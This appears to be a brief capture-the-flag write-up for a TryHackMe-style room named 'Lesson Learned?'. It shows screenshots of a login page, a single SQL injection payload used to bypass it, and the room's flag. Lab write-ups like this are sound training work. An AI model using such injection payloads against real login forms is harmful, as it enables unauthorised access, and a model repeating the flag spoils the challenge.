# Lesson Learned? Write-up

<img src="https://github.com/user-attachments/assets/3c795194-b26b-4724-9ba2-d30ca7cf7680" width="200" height="200">

Login page:

![image](https://github.com/user-attachments/assets/b7c2fa2c-f758-40d6-a77a-fd5e9254256b)

SQL injection 

If you use the wrong payload, you will get an error and have to restart the machine.

Payload:

    1' UNION SELECT null-- -

![image](https://github.com/user-attachments/assets/357365bf-b255-4159-ac88-1ac588e6be81)

![image](https://github.com/user-attachments/assets/c036fc4b-343e-4c33-b143-4b3f2d286b0c)

FLAG:

    THM{aab02c6b76bb752456a54c80c2d6fb1e}
